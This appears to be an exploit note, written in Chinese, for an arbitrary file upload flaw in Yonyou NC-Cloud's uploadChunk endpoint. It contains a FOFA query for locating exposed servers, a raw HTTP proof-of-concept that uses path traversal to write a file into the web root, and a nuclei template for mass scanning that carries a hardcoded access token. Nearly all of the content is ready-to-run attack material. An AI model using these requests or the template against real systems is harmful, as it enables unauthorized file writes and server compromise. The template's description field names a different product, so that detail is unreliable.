## 用友NC-Cloud uploadChunk 任意文件上传漏洞

## fofa
```
app="用友-NC-Cloud"
```


## POC

```
POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9

--024ff46f71634a1c9bf8ec5820c26fa9--
Content-Disposition: form-data; name="file"; filename="test.txt"

1123213
--024ff46f71634a1c9bf8ec5820c26fa9--

```

文件上传路径访问
/nccloud/test.txt

## nuclei批量yaml文件
```yaml
id: yonyou_NCCloud_uploadChunk_upload

info:
  name: 用友NC Cloud uploadChunk任意文件上传漏洞
  author: afan
  severity: critical
  tags: yonyou,changjietong,bjxsec,yonyouoa
  description: fofa   app="畅捷通-TPlus"
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
  file_content: "{{to_lower(rand_text_alpha(26))}}"
requests:
  - raw:
      - |
        POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
        Content-Length: 153

        --024ff46f71634a1c9bf8ec5820c26fa9
        Content-Disposition: form-data; name="file"; filename="{{file_name}}"

        {{file_content}}
        --024ff46f71634a1c9bf8ec5820c26fa9--
      
      - |
        GET /nccloud/{{file_name}} HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: word
        words:
          - "{{file_content}}"
        part: body


```
